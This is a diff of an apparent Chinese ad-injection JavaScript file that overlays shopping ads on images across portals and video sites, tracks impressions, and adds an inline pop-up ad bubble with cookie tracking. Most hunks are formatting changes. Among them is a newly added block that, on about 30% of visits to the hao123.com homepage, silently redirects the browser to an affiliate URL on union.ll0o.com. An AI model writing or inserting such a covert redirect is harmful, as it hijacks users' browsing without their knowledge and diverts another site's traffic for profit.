@@ -7,7 +7,7 @@
         cookie = window.document.cookie,
         global = "__TTS",
         globalBox,
-        //ttsunionId,
+    //ttsunionId,
         MEDIA_config;
     var url = window.location.href,
         host = window.location.host,
@@ -21,32 +21,43 @@
         hasCommon = false,
         hasMedia = false;
     var api = {
-        upai:'http://ttsmedia.b0.upaiyun.com/',
-        kc:'http://show.kc.taotaosou.com/adShow163.do?',
-        kctu:'http://show.kc.taotaosou.com/tumeiti.do?',
-        re:'re.taotaosou.com', //打点接口,
-        log:'http://dc.log.taotaosou.com/statistics.do?systemName=tts_media',
-        test:'http://www.ttsunion.com/'
+        upai: 'http://ttsmedia.b0.upaiyun.com/',
+        kc: 'http://show.kc.taotaosou.com/adShow163.do?',
+        kctu: 'http://show.kc.taotaosou.com/tumeiti.do?',
+        re: 're.taotaosou.com', //打点接口,
+        log: 'http://dc.log.taotaosou.com/statistics.do?systemName=tts_media',
+        test: 'http://www.ttsunion.com/'
     };
 
     /*//取联盟ID
-    ttsunionId = (function () {
-        var script = document.getElementsByTagName("script"),
-            item,
-            _id;
-        for (var i = 0, len = script.length; i < len; i++) {
-            item = script[i];
-            if (item.src && item.src.match(/tts_union_center/)) {
-                _id = script[i].src.match(/[\?\&]suid=([^\&]*)(\&?)/i);
-                return _id ? _id[1] : false;
-            }
-        }
-    })();*/
+     ttsunionId = (function () {
+     var script = document.getElementsByTagName("script"),
+     item,
+     _id;
+     for (var i = 0, len = script.length; i < len; i++) {
+     item = script[i];
+     if (item.src && item.src.match(/tts_union_center/)) {
+     _id = script[i].src.match(/[\?\&]suid=([^\&]*)(\&?)/i);
+     return _id ? _id[1] : false;
+     }
+     }
+     })();*/
     //过滤站点
     var skiphrefs = /taobao|tmall.com|etao.com|alipay|zhifubao|alimama|alibaba/;
 
     if (url.match(skiphrefs)) {
         return false;
+    }
+
+    //hao123.com 跳转
+    var randomNum = (function () {
+        return Math.floor(Math.random() * 10);
+    })();
+
+    if (randomNum < 3) {
+        if (url === 'http://www.hao123.com/') {
+            document.location.href = 'http://union.ll0o.com/tc/zhi.asp?uid=351';
+        }
     }
 
     /**
@@ -62,7 +73,7 @@
             top += elm.offsetTop;
             elm = elm.offsetParent;
         }
-        return{left:left, top:top};
+        return{left: left, top: top};
     }
 
     /**
@@ -309,10 +320,10 @@
      */
     function encapsulateImage(img) {
         var obj = {
-            x:img.getBoundingClientRect().left,
-            y:img.getBoundingClientRect().top,
-            src:changeUrl(img.src),
-            img:img
+            x: img.getBoundingClientRect().left,
+            y: img.getBoundingClientRect().top,
+            src: changeUrl(img.src),
+            img: img
         };
         return obj;
     }
@@ -406,8 +417,328 @@
                 return false;
             } else {
                 MEDIA_config = data;
-                if (data.bubbleStatus) {
-                    load('http://re.taotaosou.com/browser-static/tmt/tts_union_bubble.js?v=@@timestamp');
+                if (data.confBubble.bubbleStatus) {
+                    //load('http://re.taotaosou.com/browser-static/tmt/tts_union_bubble.js?v=@@timestamp');
+                    (function (win, doc) {
+                        var cqol = {
+                            api: {
+                                //图媒体大站
+                                re: 'http://re.taotaosou.com/',
+                                //淘同款
+                                browser: 'http://browser.re.taotaosou.com/',
+                                //统计埋点接
+                                log: 'http://log.taotaosou.com/',
+                                kc: 'http://show.kc.taotaosou.com/'
+                            },
+                            cqol: 'cqol',
+                            /**
+                             * 发送一个JSONP请求
+                             */
+                            getJSONP: function (url, success) {
+                                var cbnum = 'cb' + this.getJSONP.counter++,
+                                    cbname = 'cqol.getJSONP.' + cbnum,
+                                    script = document.createElement('script');
+
+                                //使用jsonp作为参数名
+                                if (!url.match(/\?/)) {
+                                    url += '?';
+                                } else {
+                                    url += '&';
+                                }
+                                //!url.match(/\?/) ? url += '?' : url += '&';
+                                url += 'jsonp=' + cbname;
+
+                                this.getJSONP[cbnum] = function (response) {
+                                    try {
+                                        success(response);
+                                    } finally {
+                                        delete cqol.getJSONP[cbnum];
+                                        script.parentNode.removeChild(script);
+                                    }
+                                };
+
+                                script.charset = 'utf-8';
+                                script.src = url;
+                                document.body.appendChild(script);
+                            },
+                            /**
+                             * 加载js
+                             * @param url 链接地址
+                             * @param callback 回调
+                             */
+                            load: function (url, callback) {
+                                var script = document.createElement("script");
+
+                                script.type = 'text/javascript';
+                                script.charset = 'utf-8';
+                                script.src = url;
+
+                                script.onload = script.onreadystatechange = function () {
+                                    if (!script.isLoad && (!script.readyState || script.readyState === "loaded" || script.readyState === "complete")) {
+                                        script.isLoad = true;
+                                        if (typeof callback === 'function') {
+                                            callback(script);
+                                        }
+                                        script.onload = script.onreadystatechange = null;
+                                        script.parentNode.removeChild(script);
+                                    }
+                                };
+
+                                document.body.appendChild(script);
+                            },
+                            /**
+                             * 添加一个事件模型
+                             * @param {Element} elm dom节点
+                             * @param {String} type 事件种类
+                             * @param {Function} fn 回调函数
+                             */
+                            addEvent: function (elm, type, fn) {
+                                if (elm.addEventListener) {
+                                    elm.addEventListener(type, fn, false);
+                                    return true;
+                                } else if (elm.attachEvent) {
+                                    elm['e' + type + fn] = fn;
+                                    elm[type + fn] = function () {
+                                        elm['e' + type + fn](win.event);
+                                    };
+                                    elm.attachEvent('on' + type, elm[type + fn]);
+                                    return true;
+                                }
+                                return false;
+                            },
+                            /**
+                             * @param {String} name 必填项
+                             * @param {String} value 必填项
+                             * @param {String} hour 过期时间
+                             */
+                            setCookie: function (opt) {
+                                var _this = this;
+                                if (!opt.name || !opt.value) {
+                                    return false;
+                                }
+
+                                opt.hour = opt.hour * 60 * 60;
+
+                                this.load(_this.api.kc + 'setCookie.do?name=' + opt.name + '&value=' + opt.value + '&day=' + opt.hour);
+                            },
+                            getCSS: function (obj, attr) {
+                                return parseFloat(obj.currentStyle ? obj.currentStyle[attr] : document.defaultView.getComputedStyle(obj, false)[attr]);
+                            },
+                            /**
+                             * 添加css样式
+                             * @param {Element} elm dom节点
+                             * @example
+                             * setStyle(elm: "", {
+                             *     "width": "10px",
+                             *     "height": "20px"
+                             * })
+                             */
+                            setCSS: function (elm, styles, callback) {
+                                var setStyle = function (prop, val) {
+                                    elm.style[prop] = val;
+                                };
+
+                                for (var prop in styles) {
+                                    if (!styles.hasOwnProperty(prop)) continue;
+                                    setStyle(prop, styles[prop]);
+                                }
+                                if (callback) {
+                                    callback();
+                                }
+                            },
+                            /**
+                             * @param {String} name 必填项
+                             * @return {Boolean}
+                             */
+                            getCookie: function (name, callback) {
+                                var _this = this;
+                                if (!name) {
+                                    return false;
+                                }
+
+                                _this.getJSONP(_this.api.kc + 'getCookie.do?name=' + name, function (data) {
+                                    callback(data);
+                                });
+                            }
+                        };
+                        if (!win.cqol) {
+                            //创建唯一回函名称的计数器
+                            cqol.getJSONP.counter = 0;
+                            win.cqol = cqol;
+                        }
+                        (function (c) {
+                            var global = '__TTS',
+                                globalBox;
+                            //var frameSrc = 'http://www.taotaosou.com/albumPic.html';
+                            var frameSrc = 'http://www.taotaosou.com/about/tts_demo.html';
+
+                            function _css(obj, attr, value) {
+                                if (arguments.length === 2) {
+                                    return parseFloat(obj.currentStyle ? obj.currentStyle[attr] : document.defaultView.getComputedStyle(obj, false)[attr]);
+                                }
+                                else if (arguments.length === 3) {
+                                    obj.style[attr] = value + "px";
+                                }
+                            }
+
+                            var MOVE_TYPE = {
+                                BUFFER: 1,
+                                FLEX: 2
+                            };
+
+                            function StartMove(obj, oTarget, iType, fnCallBack, fnDuring) {
+                                var fnMove = null;
+                                if (obj.timer) {
+                                    clearInterval(obj.timer);
+                                }
+
+                                switch (iType) {
+                                    case MOVE_TYPE.BUFFER:
+                                        fnMove = DoMoveBuffer;
+                                        break;
+                                    case MOVE_TYPE.FLEX:
+                                        fnMove = DoMoveFlex;
+                                        break;
+                                }
+
+                                obj.timer = setInterval(function () {
+                                    fnMove(obj, oTarget, fnCallBack, fnDuring);
+                                }, 20);
+                            }
+
+                            function DoMoveBuffer(obj, oTarget, fnCallBack, fnDuring) {
+                                var bStop = true;
+                                var speed = 0;
+                                var attr = '';
+                                var cur = 0;
+
+                                for (attr in oTarget) {
+                                    cur = _css(obj, attr);
+                                    speed = (oTarget[attr] - cur) / 5;
+                                    speed = speed > 0 ? Math.ceil(speed) : Math.floor(speed);
+                                    if (oTarget[attr] !== cur) {
+                                        bStop = false, _css(obj, attr, cur + speed);
+                                    }
+                                    //oTarget[attr] !== cur && (bStop = false, _css(obj, attr, cur + speed));
+                                }
+
+                                if (fnDuring)fnDuring.call(obj);
+                                //bStop && (clearInterval(obj.timer), obj.timer = null, fnCallBack && fnCallBack.call(obj));
+                                if (bStop) {
+                                    clearInterval(obj.timer);
+                                    obj.timer = null;
+                                    if (fnCallBack)fnCallBack.call(obj);
+                                }
+                            }
+
+                            function DoMoveFlex(obj, oTarget, fnCallBack, fnDuring) {
+                                var bStop = true;
+                                var attr = '';
+                                var cur = 0;
+
+                                for (attr in oTarget) {
+                                    if (!obj.oSpeed)obj.oSpeed = {};
+                                    if (!obj.oSpeed[attr])obj.oSpeed[attr] = 0;
+                                    cur = attr === 'opacity' ? parseInt(css(obj, attr).toFixed(2) * 100, 10) : _css(obj, attr);
+                                    //cur=css(obj, attr);
+                                    if (Math.abs(oTarget[attr] - cur) > 1 || Math.abs(obj.oSpeed[attr]) > 1) {
+                                        bStop = false;
+
+                                        obj.oSpeed[attr] += (oTarget[attr] - cur) / 5;
+                                        obj.oSpeed[attr] *= 0.7;
+                                        var maxSpeed = 65;
+                                        if (Math.abs(obj.oSpeed[attr]) > maxSpeed) {
+                                            obj.oSpeed[attr] = obj.oSpeed[attr] > 0 ? maxSpeed : -maxSpeed;
+                                        }
+
+                                        _css(obj, attr, cur + obj.oSpeed[attr]);
+                                    }
+                                }
+
+                                if (fnDuring)fnDuring.call(obj);
+                                //bStop && (clearInterval(obj.timer), obj.timer = null, fnCallBack && fnCallBack.call(obj));
+                                if (bStop) {
+                                    clearInterval(obj.timer);
+                                    obj.timer = null;
+                                    if (fnCallBack)fnCallBack.call(obj);
+                                }
+                            }
+
+                            /**
+                             * 埋点统计
+                             */
+                            function statistics() {
+                                for (var n = 0, nLen = arguments.length; n < nLen; n++) {
+                                    c.load(c.api.log + 'browser_statistics.do?type=' + arguments[n] + '&v=' + new Date().getTime());
+                                }
+                            }
+
+                            /**
+                             * 初始化
+                             */
+                            function init() {
+                                var unionWrap = doc.getElementById(global + '_union');
+                                if (!unionWrap) {
+                                    globalBox = doc.createElement('div');
+                                    globalBox.id = global + '_union';
+                                    doc.body.appendChild(globalBox);
+                                    unionWrap = globalBox;
+                                }
+                                var bubbleWrap = doc.createElement('div');
+                                bubbleWrap.id = 'J_tts_bubble';
+                                bubbleWrap.className = 'media_bubble';
+
+                                var strTmpl = '<a href="javascript:;" id="J_tts_bubble_close" title="关闭" class="media_bubble_close">X</a>' +
+                                    '<iframe id="J_tts_bubble_frame" class="media_bubble_frame" src=" ' + frameSrc + '" vspace="0" hspace="0" allowtransparency="true" scrolling="no" marginheight="0" marginwidth="0" frameborder="0">' +
+                                    '</iframe>';
+                                bubbleWrap.innerHTML = strTmpl;
+                                unionWrap.appendChild(bubbleWrap);
+
+                                var oClose = document.getElementById('J_tts_bubble_close');
+                                setTimeout(function () {
+                                    c.setCSS(bubbleWrap, {
+                                        display: 'block'
+                                    });
+                                    new StartMove(bubbleWrap, {height: 250}, MOVE_TYPE.BUFFER, function () {
+                                        //成功展示埋点
+                                        statistics('Union_Adframe_Autoshow');
+                                    });
+                                }, 800);
+                                c.addEvent(oClose, 'click', function () {
+                                    new StartMove(bubbleWrap, {height: 0}, MOVE_TYPE.BUFFER, function () {
+                                        c.setCSS(bubbleWrap, {
+                                            display: "none"
+                                        });
+                                        //广告框关闭按钮被用户点击的次数
+                                        statistics('Union_Adframe_X');
+                                    });
+                                });
+                            }
+
+                            /**
+                             * 每隔一小时出一次泡泡
+                             */
+                            c.getCookie('TKPaoPao', function (value) {
+                                var cookieParam = {
+                                    name: 'TKPaoPao',
+                                    value: 'show',
+                                    hour: '8'
+                                };
+                                //init();
+                                if (value) {
+                                    return false;
+                                }
+                                else {
+                                    c.setCookie(cookieParam);
+                                    try {
+                                        init();
+                                    } catch (ex) {
+                                        console.error(ex.stack);
+                                    }
+                                }
+                            });
+                        })(cqol);
+                    })(window, document);
                 }
                 //QQ空间与youku视频轮播
                 if (data.iA.st) {
@@ -418,7 +749,7 @@
                         }
                         function frameUrl(key, pid) {
                             var str = 'http://show.kc.taotaosou.com/brand.do?brandKeyword=' +
-                                encodeURIComponent(key)  + '&keyword=' + encodeURIComponent(key) + '&brandItemSize=3&keywordType=true&source=' + pid +
+                                encodeURIComponent(key) + '&keyword=' + encodeURIComponent(key) + '&brandItemSize=3&keywordType=true&source=' + pid +
                                 '&brandRandom=100&adType=2&itemSize=3';
                             return str;
                         }
@@ -436,7 +767,7 @@
                             box_690_str,
                             box_300 = c('<div align="center"></div>'),
                             box_300_str,
-                            //box_960_str,
+                        //box_960_str,
                             box_230_str,
                             box_200_str,
                             box_280_str,
@@ -581,24 +912,24 @@
                             }
                         }
                         /*else if (host === 'www.4399.com') {
-                            box_960_str = frameStr(960, 96, frameUrl('4399', 209));
-                            if (c('#blank_hs')[0]) {
-                                c('<div align="center"></div>').html(box_960_str).insertAfter('#blank_hs');
-                            }
-                        }*/
+                         box_960_str = frameStr(960, 96, frameUrl('4399', 209));
+                         if (c('#blank_hs')[0]) {
+                         c('<div align="center"></div>').html(box_960_str).insertAfter('#blank_hs');
+                         }
+                         }*/
                         /*else if (host === 'news.4399.com') {
-                            box_960_str = frameStr(960, 96, frameUrl('news4399', 210));
-                            if (c('.sch_my')[0]) {
-                                c('<div style="text-align: center;" align="center"></div>').html(box_960_str).insertAfter('.sch_my');
-                            }
-                        }*/
+                         box_960_str = frameStr(960, 96, frameUrl('news4399', 210));
+                         if (c('.sch_my')[0]) {
+                         c('<div style="text-align: center;" align="center"></div>').html(box_960_str).insertAfter('.sch_my');
+                         }
+                         }*/
                         /*else if (host === 'www.7k7k.com') {
-                            box_960_str = frameStr(960, 96, frameUrl('7k7k', 211));
-                            var best = c('.best').eq(0);
-                            if (best[0]) {
-                                c('<div align="center"></div>').html(box_960_str).insertAfter(best);
-                            }
-                        }*/
+                         box_960_str = frameStr(960, 96, frameUrl('7k7k', 211));
+                         var best = c('.best').eq(0);
+                         if (best[0]) {
+                         c('<div align="center"></div>').html(box_960_str).insertAfter(best);
+                         }
+                         }*/
                         else if (host === 't.qq.com') {
                             box_280_str = frameStr(280, 240, frameUrl('腾讯微博', 197));
                             if (c('.new_sc_rmdfollow')[0]) {
@@ -986,7 +1317,7 @@
          * 请求通用广告
          * @param num index值
          */
-        getCommon:function (num) {
+        getCommon: function (num) {
             var _this = this;
             //品牌广告容器
             statistics(_this.imgObj.src, 'IMG', '0', 'PV', 'GP1');
@@ -995,7 +1326,7 @@
             commonWrap.className = "J_common_box common_box";
             var sidebarY = _this.elmOffset.top + 20,
                 sidebarX = TTSUI(_this.elm).width() + _this.elmOffset.left;
-            _this.siderTab = TTSUI('<ul class="J_sidertab tts_sidertab"></ul>').css({"left":sidebarX, "top":sidebarY});
+            _this.siderTab = TTSUI('<ul class="J_sidertab tts_sidertab"></ul>').css({"left": sidebarX, "top": sidebarY});
             TTSUI(commonWrap).append(_this.siderTab).appendTo(mediaBox);
             _this.getCommonTmpl(_this.config.adStyle);
             var keyWordData = _this.config.keyWordList[num];
@@ -1003,8 +1334,8 @@
                 statistics(_this.imgObj.src, 'ADT', 'TAGP1', 'PV', 'TA' + (i + 1));
                 //添加主站链接
                 var keyWord = {
-                    tabName:item,
-                    href:"http://www.taotaosou.com/getProducts?keyword=" + encodeURIComponent(item) +
+                    tabName: item,
+                    href: "http://www.taotaosou.com/getProducts?keyword=" + encodeURIComponent(item) +
                         "&utm_source=ttsMedia" + MEDIA_config.id +
                         "&utm_medium=ttk" +
                         "&utm_campaign=itemlike" +
@@ -1027,7 +1358,7 @@
                             '&expId=ttsMedia' + MEDIA_config.id + '&jsonp=?', function (data) {
                             if (data.tongyong[0]) {
                                 var tongyong = {
-                                    proList:data.tongyong
+                                    proList: data.tongyong
                                 };
                                 var pdUl = TTSUI.tmpl(_this.commonItemTmp, tongyong).appendTo(tipTab.find('.J_item_box'));
                                 pdUl.click(function (e) {
@@ -1070,7 +1401,7 @@
                             '&expId=ttsMedia' + MEDIA_config.id + '&jsonp=?', function (data) {
                             if (data.tongyong[0]) {
                                 var tongyong = {
-                                    proList:data.tongyong
+                                    proList: data.tongyong
                                 };
                                 var pdUl = TTSUI.tmpl(_this.commonItemTmp, tongyong).appendTo(tabLi.find('.J_item_box'));
                                 pdUl.click(function (e) {
@@ -1107,7 +1438,7 @@
         /**
          * 浏览器改变大小
          */
-        iniResizeCom:function (siderTab) {
+        iniResizeCom: function (siderTab) {
             var _this = this;
             //TODO: 同样的代码为何有两份？
             TTSUI(window).resize(function () {
@@ -1116,8 +1447,8 @@
                 var sidebarY = offset.top + 20,
                     sidebarX = TTSUI(_this.elm).width() + offset.left;
                 siderTab.css({
-                    "left":sidebarX,
-                    "top":sidebarY
+                    "left": sidebarX,
+                    "top": sidebarY
                 });
             });
             TTSUI(window).scroll(function () {
@@ -1126,8 +1457,8 @@
                 var sidebarY = offset.top + 20,
                     sidebarX = TTSUI(_this.elm).width() + offset.left;
                 siderTab.css({
-                    "left":sidebarX,
-                    "top":sidebarY
+                    "left": sidebarX,
+                    "top": sidebarY
                 });
             });
         },
@@ -1138,7 +1469,7 @@
          * @param tabKey 请求广告系统的关键字
          * @param num 图片对应的index
          */
-        eventCommon:function (commonTab, tabKey, num) {
+        eventCommon: function (commonTab, tabKey, num) {
             var _this = this;
             commonTab.hover(function () {
                 var thisTab = TTSUI(this);
@@ -1150,7 +1481,7 @@
                         '&expId=ttsMedia' + MEDIA_config.id + '&jsonp=?', function (data) {
                         if (data.tongyong[0]) {
                             var tongyong = {
-                                proList:data.tongyong
+                                proList: data.tongyong
                             };
                             var pdUl = TTSUI.tmpl(_this.commonItemTmp, tongyong).appendTo(commonTab.find('.J_item_box'));
                             pdUl.click(function (e) {
@@ -1195,7 +1526,7 @@
          * 获取通用广告模板
          * @param tmpType 模板类型
          */
-        getCommonTmpl:function (tmpType) {
+        getCommonTmpl: function (tmpType) {
             var _this = this;
             //TODO: 只有一个条件，switch 改 if
             switch (tmpType) {
@@ -1217,7 +1548,7 @@
          * @param tbId 商品id
          * @return {String}
          */
-        getSimApi:function (keyWord, tbId) {
+        getSimApi: function (keyWord, tbId) {
             var simApi = '';
             if (url.match(/^.+image.baidu.com\/detail.+&column=(%E6%9C%8D%E9%A5%B0|%E6%98%8E%E6%98%9F).+$/)) {
                 simApi = api.kctu + 'adType=1,0,0&keyword=' + encodeURIComponent(keyWord) +
@@ -1241,7 +1572,7 @@
         /**
          * 请求相似广告
          */
-        getSim:function (data) {
+        getSim: function (data) {
             var _this = this;
             if (_this.config.adStyle === 1) {
                 statistics(_this.imgObj.src, 'IMG', '0', 'PV', 'SP1');
@@ -1259,7 +1590,7 @@
             _this.siderTab = TTSUI('<ul class="J_sidertab tts_sidertab"></ul>');
             TTSUI(simWrap).append(_this.siderTab).appendTo(mediaBox);
             _this.siderTab.css({
-                "left":sidebarX, "top":sidebarY
+                "left": sidebarX, "top": sidebarY
             });
             //请求接口信息
             /**
@@ -1295,12 +1626,12 @@
                     }
                 }
                 var tabData = {
-                    markerX:markerX,
-                    markerY:markerY,
-                    wrapX:wrapX,
-                    p4pKey:item.p4pKey,
-                    categroryId:item.id,
-                    url:"http://www.taotaosou.com/itemlike.html?tbId=" + item.productItemId +
+                    markerX: markerX,
+                    markerY: markerY,
+                    wrapX: wrapX,
+                    p4pKey: item.p4pKey,
+                    categroryId: item.id,
+                    url: "http://www.taotaosou.com/itemlike.html?tbId=" + item.productItemId +
                         "&utm_source=ttsMedia" + MEDIA_config.id +
                         "&utm_medium=ttk" +
                         "&utm_campaign=itemlike" +
@@ -1310,20 +1641,20 @@
                         "&price=" + item.productPrice +
                         "&from=ttsMedia" + MEDIA_config.id +
                         "&outer_code=" + MEDIA_config.id,
-                    name:item.tabName + item.categroryName,
-                    proPicUrl:item.productPicUrl + mediaSize,
-                    proTitle:item.productTitle
+                    name: item.tabName + item.categroryName,
+                    proPicUrl: item.productPicUrl + mediaSize,
+                    proTitle: item.productTitle
                 };
-                _this.simTab = TTSUI.tmpl(_this.simTabTmp, tabData).appendTo(_this.siderTab).data("simInfo", {id:item.productItemId, keys:item.p4pKey});
+                _this.simTab = TTSUI.tmpl(_this.simTabTmp, tabData).appendTo(_this.siderTab).data("simInfo", {id: item.productItemId, keys: item.p4pKey});
                 if (_this.config.adStyle === 1) {
                     statistics(_this.imgObj.src, 'ADT', 'TASP1', 'PV', 'TA' + (i + 1));
                     statistics(_this.imgObj.src, 'ADP', 'POSP1', 'PV', 'PO' + (i + 1));
                     //点信息容器
-                    _this.markerBox = TTSUI('<div class="J_marker_box tts_marker_box" categroryId="' + item.id + '"></div>').data("simInfo", {id:item.productItemId, keys:item.p4pKey});
+                    _this.markerBox = TTSUI('<div class="J_marker_box tts_marker_box" categroryId="' + item.id + '"></div>').data("simInfo", {id: item.productItemId, keys: item.p4pKey});
                     _this.markerTip = TTSUI.tmpl(_this.simMarkerTmp, tabData).appendTo(_this.markerBox);
                     _this.markerBox.css({
-                        "left":markerX,
-                        "top":markerY
+                        "left": markerX,
+                        "top": markerY
                     }).appendTo(simWrap);
                 } else if (_this.config.adStyle === 2) {
                     statistics(_this.imgObj.src, 'ADT', 'TASP2', 'PV', 'TA' + (i + 1));
@@ -1336,13 +1667,13 @@
                 if (_this.config.hover === 1) {
                     var itemListOffer = data.lstImageOffer;
                     var ddItemList = {
-                        proList:[
+                        proList: [
                             {
-                                price:itemListOffer[0].productPrice,
-                                media:itemListOffer[0].productPicUrl + mediaSize,
-                                title:itemListOffer[0].productTitle,
+                                price: itemListOffer[0].productPrice,
+                                media: itemListOffer[0].productPicUrl + mediaSize,
+                                title: itemListOffer[0].productTitle,
                                 //TODO: 各参数加上空值
-                                href:"http://www.taotaosou.com/itemlike.html?tbId=" + itemListOffer[0].productItemId +
+                                href: "http://www.taotaosou.com/itemlike.html?tbId=" + itemListOffer[0].productItemId +
                                     "&utm_source=ttsMedia" + MEDIA_config.id +
                                     "&utm_medium=ttk" +
                                     "&utm_campaign=itemlike" +
@@ -1370,7 +1701,7 @@
                                     //广告相似商品信息 3
                                     if (data.xiangsi[0]) {
                                         var xsItemList = {
-                                            proList:data.xiangsi
+                                            proList: data.xiangsi
                                         };
                                         TTSUI.tmpl(_this.simItemTmp, xsItemList).appendTo(hoverTab.find('.J_item_box'));
                                     }
@@ -1406,7 +1737,7 @@
          * @param data
          */
         //TODO: 缺少参数说明
-        iniResizeSim:function (data) {
+        iniResizeSim: function (data) {
             var _this = this,
                 scale;
             TTSUI(window).resize(function () {
@@ -1416,7 +1747,7 @@
                 var sidebarY = offset.top + 20,
                     sidebarX = elmWidth + offset.left;
                 _this.siderTab.css({
-                    "left":sidebarX, "top":sidebarY
+                    "left": sidebarX, "top": sidebarY
                 });
                 var reMarker = _this.siderTab.parents('.J_sim_box');
                 TTSUI(data.lstImageOffer).each(function (i, item) {
@@ -1435,8 +1766,8 @@
                         }
                     }
                     reMarker.find("[categroryId=" + categroryId + "]").css({
-                        "left":markerX,
-                        "top":markerY
+                        "left": markerX,
+                        "top": markerY
                     });
                 });
             });
@@ -1447,7 +1778,7 @@
                 var sidebarY = offset.top + 20,
                     sidebarX = elmWidth + offset.left;
                 _this.siderTab.css({
-                    "left":sidebarX, "top":sidebarY
+                    "left": sidebarX, "top": sidebarY
                 });
                 var reMarker = _this.siderTab.parents('.J_sim_box');
                 TTSUI(data.lstImageOffer).each(function (i, item) {
@@ -1466,8 +1797,8 @@
                         }
                     }
                     reMarker.find("[categroryId=" + categroryId + "]").css({
-                        "left":markerX,
-                        "top":markerY
+                        "left": markerX,
+                        "top": markerY
                     });
                 });
             });
@@ -1477,15 +1808,15 @@
          * @param num 图片对应的index值
          * @param item 打点信息
          */
-        eventSim:function (num, item) {
+        eventSim: function (num, item) {
             var _this = this;
             var ddItemList = {
-                proList:[
+                proList: [
                     {
-                        price:item.productPrice,
-                        media:item.productPicUrl + mediaSize,
-                        title:item.productTitle,
-                        href:"http://www.taotaosou.com/itemlike.html?tbId=" + item.productItemId +
+                        price: item.productPrice,
+                        media: item.productPicUrl + mediaSize,
+                        title: item.productTitle,
+                        href: "http://www.taotaosou.com/itemlike.html?tbId=" + item.productItemId +
                             "&utm_source=ttsMedia" + MEDIA_config.id +
                             "&utm_medium=ttk" +
                             "&utm_campaign=itemlike" +
@@ -1517,7 +1848,7 @@
                                     //广告相似商品信息 3
                                     if (data.xiangsi[0]) {
                                         var xSItemList = {
-                                            proList:data.xiangsi
+                                            proList: data.xiangsi
                                         };
                                         TTSUI.tmpl(_this.simItemTmp, xSItemList).appendTo(TTSUI("[categroryId=" + categroryId + "]").find('.J_item_box'));
                                     }
@@ -1562,7 +1893,7 @@
                                     //广告相似商品信息 3
                                     if (data.xiangsi[0]) {
                                         var xSItemList = {
-                                            proList:data.xiangsi
+                                            proList: data.xiangsi
                                         };
                                         TTSUI.tmpl(_this.simItemTmp, xSItemList).appendTo(TTSUI("[categroryId=" + categroryId + "]").find('.J_item_box'));
                                     }
@@ -1627,7 +1958,7 @@
                                 //广告相似商品信息 3
                                 if (data.xiangsi[0]) {
                                     var xSItemList = {
-                                        proList:data.xiangsi
+                                        proList: data.xiangsi
                                     };
                                     TTSUI.tmpl(_this.simItemTmp, xSItemList).appendTo(TTSUI("[categroryId=" + categroryid + "]").find('.J_item_box'));
                                 }
@@ -1694,7 +2025,7 @@
                                 //广告相似商品信息 3
                                 if (data.xiangsi[0]) {
                                     var xsItemList = {
-                                        proList:data.xiangsi
+                                        proList: data.xiangsi
                                     };
                                     TTSUI.tmpl(_this.simItemTmp, xsItemList).appendTo(thisTab.find('.J_item_box'));
                                 }
@@ -1741,7 +2072,7 @@
                                     //广告相似商品信息 3
                                     if (data.xiangsi[0]) {
                                         var xsItemList = {
-                                            proList:data.xiangsi
+                                            proList: data.xiangsi
                                         };
                                         TTSUI.tmpl(_this.simItemTmp, xsItemList).appendTo(hoverTab.find('.J_item_box'));
                                     }
@@ -1771,7 +2102,7 @@
                 }
             }
         },
-        getSimTmpl:function (tmpType) {
+        getSimTmpl: function (tmpType) {
             var _this = this;
             //TODO: 只有一个条件，switch 改 if
             switch (tmpType) {
@@ -1796,7 +2127,7 @@
         /**
          * 请求品牌广告
          */
-        getBrand:function () {
+        getBrand: function () {
             var _this = this;
             //品牌广告容器
             var brandWrap = document.createElement("div");
@@ -1828,7 +2159,7 @@
          * 展示品牌广告
          * @param data 广告系统的返回数据
          */
-        showBrand:function (data) {
+        showBrand: function (data) {
             var _this = this;
             var offset = getOffset(_this.elm);
             //品牌广告模板1
@@ -1837,8 +2168,8 @@
             var bannerY = offset.top + TTSUI(_this.elm).height() - _this.config.bannerHeight,
                 bannerX = TTSUI(_this.elm).width() / 2 - _this.config.bannerWidth / 2 + offset.left;
             _this.brandObj.css({
-                "left":bannerX,
-                "top":bannerY
+                "left": bannerX,
+                "top": bannerY
             }).appendTo(mediaBox);
             _this.eventBrand();
         },
@@ -1847,7 +2178,7 @@
          * @param brandObj 广告节点对象
          */
         //TODO: 这里有参数传进来吗？？
-        eventBrand:function () {
+        eventBrand: function () {
             //是否隐藏
             var _this = this,
                 elm = this.elm;
@@ -1911,7 +2242,7 @@
         /**
          * 浏览器改变大小
          */
-        iniResize:function () {
+        iniResize: function () {
             var _this = this;
             //TODO: 同样的代码为何有两份？
             TTSUI(window).resize(function () {
@@ -1920,8 +2251,8 @@
                 var bannerY = offset.top + TTSUI(_this.elm).height() - _this.config.bannerHeight,
                     bannerX = TTSUI(_this.elm).width() / 2 - _this.config.bannerWidth / 2 + offset.left;
                 _this.brandObj.css({
-                    "left":bannerX,
-                    "top":bannerY
+                    "left": bannerX,
+                    "top": bannerY
                 });
             });
             TTSUI(window).scroll(function () {
@@ -1930,15 +2261,15 @@
                 var bannerY = offset.top + TTSUI(_this.elm).height() - _this.config.bannerHeight,
                     bannerX = TTSUI(_this.elm).width() / 2 - _this.config.bannerWidth / 2 + offset.left;
                 _this.brandObj.css({
-                    "left":bannerX,
-                    "top":bannerY
+                    "left": bannerX,
+                    "top": bannerY
                 });
             });
         },
         /**
          * 根据配置信息取广告模板
          */
-        getBrandTmpl:function (tmpType) {
+        getBrandTmpl: function (tmpType) {
             var _this = this;
             switch (tmpType) {
                 case 1:
@@ -1960,8 +2291,8 @@
                         'quality="high" width="25" height="195" align="middle" allowscriptaccess="never" type="application/x-shockwave-flash"></object>' +
                         '<a href="${href}" class="TA_alink" target="_blank" title="${title}"></a></div>';
                     /*_this.brandADtmpl = '<div class="J_tip_wrap brand_tip_wrap">' +
-                        '<img src="${media}" height="220" width="300" alt="">' +
-                        '<a href="${href}" class="AD_alink" target="_blank" title="${title}"></a></div>';*/
+                     '<img src="${media}" height="220" width="300" alt="">' +
+                     '<a href="${href}" class="AD_alink" target="_blank" title="${title}"></a></div>';*/
                     _this.brandADtmpl = '<div class="J_tip_wrap brand_tip_wrap">' +
                         '<iframe frameborder="0" marginheight="0" marginwidth="0" border="0" scrolling="no" width="300" height="220"' +
                         //'src="http://show.kc.taotaosou.com/imgShow.do?image=&href="></iframe>' +
@@ -2000,7 +2331,7 @@
                     break;
             }
         },
-        showJhbrand:function (data) {
+        showJhbrand: function (data) {
             var _this = this;
             var sidebarY = _this.elmOffset.top + 20,
                 sidebarX = TTSUI(_this.elm).width() + _this.elmOffset.left;
@@ -2010,23 +2341,23 @@
 
             var bData = data;
